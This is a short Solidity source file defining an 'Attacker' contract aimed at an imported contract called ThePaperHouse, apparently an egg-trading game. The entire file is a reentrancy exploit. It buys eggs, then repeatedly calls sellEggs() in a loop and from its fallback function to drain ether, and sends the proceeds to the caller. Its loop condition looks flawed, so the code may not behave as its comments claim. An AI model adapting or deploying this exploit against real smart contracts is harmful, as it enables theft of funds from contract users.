pragma solidity ^0.4.26; // solhint-disable-line

import "./ThePaperHouse.sol";

contract Attacker {
    ThePaperHouse public contractToAttack;
    uint256 public attackCounter = 0;

    constructor(address _contractToAttack) public {
        contractToAttack = ThePaperHouse(_contractToAttack);
    }

    function attack() public payable {
        // buy eggs with enough amount of ether
        contractToAttack.buyEggs.value(msg.value)(address(this));

        // call sellEggs() in a loop to trigger reentrancy
        while (address(this).balance > 0) {
            contractToAttack.sellEggs();
            attackCounter++;
        }

        // transfer any remaining funds back to the owner
        msg.sender.transfer(address(this).balance);
    }

    // fallback function to receive ether from the contract being attacked
    function() public payable {
        if (attackCounter < 10) {
            contractToAttack.sellEggs();
            attackCounter++;
        }
    }
}